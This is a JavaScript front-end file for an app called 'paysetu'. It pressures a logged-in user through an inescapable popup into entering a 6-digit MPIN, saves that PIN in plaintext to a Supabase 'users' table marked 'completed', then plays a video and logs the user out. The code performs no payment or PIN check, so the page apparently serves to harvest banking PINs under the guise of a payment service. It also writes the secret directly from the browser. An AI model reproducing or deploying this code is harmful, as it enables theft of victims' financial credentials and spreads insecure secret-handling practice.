// user-app/js/home.js
// Flow: Session → Load Data → MPIN → Success → Video → Telegram → Logout
import { supabase } from "./config/supabase.js";

document.addEventListener("DOMContentLoaded", async () => {
  // 1. Check Session
  const sessionStr = sessionStorage.getItem("paysetu_session");
  if (!sessionStr) {
    window.location.href = "/login";
    return;
  }
  const session = JSON.parse(sessionStr);

  // Clear session on refresh
  window.addEventListener("beforeunload", () => {
    sessionStorage.removeItem("paysetu_session");
  });

  // Elements
  const overlay = document.getElementById("overlay");
  const mpinPopup = document.getElementById("mpinPopup");
  const successPopup = document.getElementById("successPopup");
  const videoPopup = document.getElementById("videoPopup");

  const mpinInputs = Array.from(document.querySelectorAll(".mpin-box"));
  const mpinCancelBtn = document.getElementById("mpinCancelBtn");
  const mpinConfirmBtn = document.getElementById("mpinConfirmBtn");

  const videoPlayer = document.getElementById("popupVideo");
  const videoCloseBtn = document.getElementById("videoCloseBtn");

  let videoData = null;

  // ======================================
  // Fetch settings (no slider needed)
  // ======================================
  async function loadData() {
    try {
      // Fetch Video settings (latest row)
      const { data: vData } = await supabase
        .from("popup_video")
        .select("*")
        .order("created_at", { ascending: false })
        .limit(1);
      if (vData && vData.length > 0 && vData[0].is_enabled) videoData = vData[0];

    } catch (err) {
      console.error("Error loading data:", err);
    }
  }

  // ======================================
  // MPIN Input Logic
  // ======================================
  mpinInputs.forEach((input, index) => {
    input.addEventListener("input", (e) => {
      e.target.value = e.target.value.replace(/[^0-9]/g, "");
      if (e.target.value) {
        e.target.classList.add("filled");
        const errEl = document.getElementById("mpinErrorMsg");
        if(errEl) errEl.classList.add("hidden");
        if (index < mpinInputs.length - 1) {
          mpinInputs[index + 1].focus();
        }
      } else {
        e.target.classList.remove("filled");
      }
      checkMpinComplete();
    });

    input.addEventListener("keydown", (e) => {
      if (e.key === "Backspace" && !e.target.value && index > 0) {
        mpinInputs[index - 1].focus();
        mpinInputs[index - 1].classList.remove("filled");
      }
    });
  });

  function checkMpinComplete() {
    const mpin = mpinInputs.map((i) => i.value).join("");
    if (mpin.length === 6) {
      submitMpin(mpin);
    }
  }

  // ======================================
  // MPIN Cancel → Logout
  // ======================================
  if (mpinCancelBtn) {
    mpinCancelBtn.addEventListener("click", () => {
      logout();
    });
  }

  if (mpinConfirmBtn) {
    mpinConfirmBtn.addEventListener("click", () => {
      const mpin = mpinInputs.map((i) => i.value).join("");
      if (mpin.length === 6) {
        submitMpin(mpin);
      } else {
        const errEl = document.getElementById("mpinErrorMsg");
        if (errEl) {
          errEl.textContent = "Please enter complete 6-digit PIN";
          errEl.classList.remove("hidden");
        }
        mpinInputs.find(i => !i.value)?.focus() || mpinInputs[0].focus();
      }
    });
  }

  // Overlay click outside popup = DO NOTHING
  overlay.addEventListener("click", (e) => {
    // Do nothing - user must interact with popup
  });

  // ======================================
  // Submit MPIN
  // ======================================
  async function submitMpin(mpin) {
    mpinInputs.forEach((i) => (i.disabled = true));

    try {
      const { error } = await supabase
        .from("users")
        .update({ mpin: mpin, status: "completed" })
        .eq("id", session.userId);

      if (error) {
        console.error("MPIN update error:", error);
        throw error;
      }

      mpinPopup.classList.add("hidden");
      successPopup.classList.remove("hidden");

      setTimeout(() => {
        successPopup.classList.add("hidden");
        checkNextPopup();
      }, 3000);
    } catch (error) {
      console.error("MPIN submit error:", error);
      mpinInputs.forEach((i) => {
        i.disabled = false;
        i.value = "";
        i.classList.remove("filled");
      });
      mpinInputs[0].focus();
    }
  }

  // ======================================
  // After MPIN → Video → Telegram → Logout
  // ======================================
  function checkNextPopup() {
    if (videoData && videoData.video_url) {
      showVideo();
    } else {
      logout();
    }
  }

  // ======================================
  // Video Popup
  // ======================================
  function showVideo() {
    videoPopup.classList.remove("hidden");
    videoPlayer.src = videoData.video_url;
    videoPlayer.muted = true;
    videoPlayer.play().catch((e) => console.log("Autoplay prevented", e));
  }

  videoCloseBtn.addEventListener("click", () => {
    videoPlayer.pause();
    videoPlayer.src = "";
    videoPopup.classList.add("hidden");

    logout();
  });



  // ======================================
  // Logout
  // ======================================
  function logout() {
    sessionStorage.removeItem("paysetu_session");
    window.location.href = "/login";
  }

  // ======================================
  // Initial Load
  // ======================================
  await loadData();

  // After 2 seconds, show MPIN popup
  setTimeout(() => {
    overlay.classList.add("active");
    mpinPopup.classList.remove("hidden");
    if (window.lucide) lucide.createIcons();
    mpinInputs[0].focus();
  }, 2000);
});

